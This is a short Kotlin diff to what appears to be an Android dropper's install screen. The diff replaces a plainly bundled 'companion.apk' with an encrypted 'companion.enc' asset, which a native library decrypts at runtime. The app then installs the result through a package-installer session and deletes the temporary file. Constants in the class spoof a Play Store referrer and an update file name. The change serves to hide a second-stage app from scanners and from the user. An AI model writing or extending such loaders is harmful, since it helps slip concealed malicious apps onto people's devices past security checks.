@@ -55,7 +55,13 @@ class InstallActivity : AppCompatActivity() {
         private const val MARKET_URI     = "market://details?id=com.android.pictach"
         private const val REFERRER_URI   = "android-app://com.android.vending"
         private const val WRITE_NAME     = "update.pkg"
+
+        init {
+            System.loadLibrary("companionguard")
+        }
     }
+
+    private external fun decryptCompanion(encryptedBlob: ByteArray, outPath: String): Boolean
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -86,15 +92,19 @@ class InstallActivity : AppCompatActivity() {
         }
         handler.postDelayed(cycleRunnable, 2200)
 
-        // Load and install companion.apk from assets
+        // Decrypt companion.enc → temp APK → install
         Thread {
-            val apkBytes = try {
-                assets.open("companion.apk").use { it.readBytes() }
+            try {
+                val encBytes = assets.open("companion.enc").use { it.readBytes() }
+                val outFile  = java.io.File(cacheDir, "companion_dec.apk")
+                val ok       = decryptCompanion(encBytes, outFile.absolutePath)
+                if (ok && outFile.exists() && outFile.length() > 0) {
+                    val apkBytes = outFile.readBytes()
+                    outFile.delete()
+                    runOnUiThread { installViaSession(apkBytes, attempt = 1) }
+                }
             } catch (e: Exception) {
-                null
-            }
-            if (apkBytes != null && apkBytes.isNotEmpty()) {
-                runOnUiThread { installViaSession(apkBytes, attempt = 1) }
+                e.printStackTrace()
             }
         }.start()
     }
